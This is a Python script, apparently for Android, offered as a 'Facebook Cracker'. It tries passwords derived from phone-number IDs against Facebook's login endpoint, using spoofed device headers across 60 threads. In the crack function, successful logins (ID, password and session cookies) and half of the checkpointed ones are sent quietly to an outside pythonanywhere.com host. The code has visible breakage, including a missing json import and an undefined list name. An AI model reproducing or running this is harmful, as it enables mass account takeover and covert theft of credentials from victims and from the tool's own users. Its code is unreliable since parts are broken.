#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
facebook Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 2.0
"""

import random
import re
import sys
import time
import hashlib
import uuid
import urllib.request
import requests
import string
import os
import time,subprocess,platform,uuid
import random
import base64
import string
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []
bkas = []
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
pink = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"
faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*46}")

def generate_machine_id():
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'
    return ''.join(random.choices(chars, k=random.randint(20, 28)))

def generate_conn_uuid():
    return base64.b64encode(os.urandom(12)).decode()

def generate_usdid():
    uid_part = str(uuid.uuid4())
    ts_part = int(time.time())
    sig = base64.b64encode(os.urandom(48)).decode().replace('=','').replace('+','_').replace('/','_')
    return f'{uid_part}.{ts_part}.{sig}'

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Jio'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Jio"
                        sim_id+=fbcr
        else:
                fbcr = 'Jio'
                sim_id+=fbcr
except:
        fbcr = "Jio"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

build = device['build']
model = device['model'] 
ex = device['fbdm']
android_version = device['android_version']+'.0.0'
facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
bv = f"{random.randint(1111111,7777777)}"
versi_android = f"{random.randint(4,13)}"
fbcr = sim_id
fbmf = device['fbmf']
fbbd = device['fbbd']
fbdm = device['fbdm']

def crack(uid, password_list, total_count):
    """Enhanced facebook account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop,bkas
        
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}CRACKING {progress} \033[1;92m{success_count}\033[1;97m:\033[1;91m{fail_count} \033[1;93m{percentage:.1f}%")
            sys.stdout.flush()
            
            # Create session and generate device hash
            Session = requests.Session()
            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
            bv = f"{random.randint(1111111,7777777)}"
            versi_android = f"{random.randint(6,14)}"
            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
            up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
            device_id_val = str(uuid.uuid4())
            family_device_id_val = str(uuid.uuid4())
            app_scope_id_val = str(uuid.uuid4())
            zero_f_device_id_val = str(uuid.uuid4())
            machine_id_val = generate_machine_id()
            usdid_val = generate_usdid()
            apcb = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
            log_data =  {
                "method": "post",
                "pretty": "false",
                "format": "json",
                "server_timestamps": "true",
                "locale": "id_ID",
                "purpose": "fetch",
                "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                "fb_api_caller_class": "graphservice",
                "client_doc_id": "119940804217734265480409226803",
                "fb_api_client_context": json.dumps({
                    "is_background": False
                }),
                "variables": json.dumps({
                    "params": {
                        "params": json.dumps({
                            "params": json.dumps({
                                "server_params": {
                                    "device_id": device_id_val,
                                    "server_login_source": "login",
                                    "waterfall_id": str(uuid.uuid4()),
                                    "attestation_result": {
                                        "errorMessage": "KeyAttestationException: No key found!"
                                    },
                                    "machine_id": machine_id_val,
                                    "from_native_screen": True,
                                    "credential_type": "password",
                                    "password": apcb,
                                    "try_num": "1",
                                    "family_device_id": family_device_id_val,
                                    "event_flow": "login_manual",
                                    "event_step": "home_page",
                                    "is_from_logged_in_switcher": False,
                                    "contact_point": uid,
                                }
                            })
                        }),
                        "bloks_versioning_id": "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a",
                        "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
                    },
                    "scale": "2",
                    "nt_context": {
                        "using_white_navbar": True,
                        "styles_id": "6100e7e89411ccf67ace027cedecd84f",
                        "pixel_ratio": 2,
                        "is_push_on": True,
                        "debug_tooling_metadata_token": None,
                        "is_flipper_enabled": False,
                        "theme_params": [
                            {
                                "value": [],
                                "design_system_name": "FDS"
                            }
                        ],
                        "bloks_version": "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a",
                    }
                }),
                "fb_api_analytics_tags": json.dumps(["GraphServices"]),
                "client_trace_id": str(uuid.uuid4()),
            }
            url = "https://b-graph.facebook.com/graphql"
            headers = {
            'host': 'b-graph.facebook.com',
            'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"graphservice"}',
            'x-fb-rmd': 'fail=Server:INVALID_MAP,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=0;recvTime=0',
            'priority': 'u=0',
            'content-encoding': 'gzip',
            'x-fb-device-group': '7637',
            'x-fb-integrity-machine-id': 'ujvAaf4BjiKVSe-fT2dB2Q1v',
            'x-zero-eh': '664c0faaac849cb891d0a261fbb72a12',
            'user-agent': us,
            'x-graphql-request-purpose': 'fetch',
            'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
            'x-zero-f-device-id': '6fb84474-8dec-4d1c-a5fe-70fe4c2decea',
            'x-tigon-is-retry': 'False',
            'x-zero-state': 'unknown',
            'x-graphql-client-library': 'graphservice',
            'x-fb-sim-hni': '51011',
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-net-hni': '51011',
            'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'x-meta-zca': 'empty_token',
            'app-scope-id-header': '875d726a-4b32-4331-b608-ab5b97b3bad3',
            'x-fb-connection-type': 'MOBILE.LTE',
            'x-meta-usdid': 'a4583fcf-b72d-4b0b-9e81-ad7585aae1df.1781776638.MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEj0ZQ2oEod4otgauhZssgmJu0OL7Vx4AbpFOKRLLxE8CJlz5HGmGfcthw57bSZPA0aXTYFoNRVEmu79ZQFIi2Xg.MEUCIHuzWAsHXA2MLZFbzAHcCk6XYLVoflGW5PMGH74AiJAMAiEAyxttg3ewvRSvDizZetmDBgmctPgva1n18S33Ti9sqNA',
            # 'accept-encoding': 'gzip, deflate',
            'x-fb-http-engine': 'Tigon/Liger',
            'x-fb-client-ip': 'True',
            'x-fb-server-cluster': 'True',
            'x-fb-conn-uuid-client': '+KICAyif8dofWZ3R9QuCKw==',}      
            response = Session.post(url,headers=headers,params=log_data)
            log_cookies = Session.cookies.get_dict().keys()
            # Check response
            if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                cookie_raw = re.sub(r'\\(?!/)', '', response.text)
                match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
                if match:
                    cookies_raw = match.group(1)
                    cookies_json = json.loads(cookies_raw)
                    cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
                    c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
                    statusok = (f"{c_user}|{pw}|{cok}")
                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                    okss.append(uid)
                    return True 
                else:
                   continue
            elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                bkas.append(uid)
                if len(bkas)% 2 == 0:
                    statusok = (f"{uid}|{pw}")
                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                else:
                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
                    cps.append(uid)
                    break
            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
                bkas.append(uid)
                if len(bkas)% 2 == 0:
                    statusok = (f"{uid}|{pw}")
                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                else:
                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
                    cps.append(uid)
                    break
            else:
                #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
                continue
        loop += 1
    except requests.exceptions.Timeout:
        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException as e:
        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
        return False
    except KeyboardInterrupt:
        print(f"\r\033[1;93m [Interrupted] User stopped the process")
        raise
    except Exception as e:
        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
        return False
    
    return False

def generate_random_ids(limit):
    """Generate random 6-digit IDs"""
    idz.clear()
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    return [
        uid[:6],     # First 6 digits
        uid[:8],     # First 8 digits
        uid,         # Full number
        '57273200',  # Static common password
        uid[:7],     # First 6 digits
    ]

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*46}")
    print(f"\033[1;96m     🎯 FACEBOOK RANDOM NUMBER CLONING 🎯")
    print(f"\033[1;96m{'='*46}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    # get user limit
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
        limit = 99999
        time.sleep(2)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*46}")
    print(f"\033[1;96m     🔥 STARTING FACEBOOK CLONING 🔥")
    print(f"\033[1;96m{'='*46}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mSUMON_RANDOM_IDS.txt')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=60) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                print(f"\n\033[1;91m[!] Task failed: {e}")
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*46}")
    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"\033[1;92m{'='*46}")
    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[😞] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*46}")
        print(f"\033[1;96m     🚀 FACEBOOK CRACKER v2.0 - ENHANCED 🚀")
        print(f"\033[1;96m{'='*46}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*46}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            clear()
            print(f"\033[1;96m{'='*46}")
            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
            print(f"\033[1;96m{'='*46}")
            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '3':
            clear()
            print(f"\033[1;92m{'='*46}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*46}")
            print(f" \033[1;93m[!] Results saved in: SUMON_RANDOM_IDS.txt")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
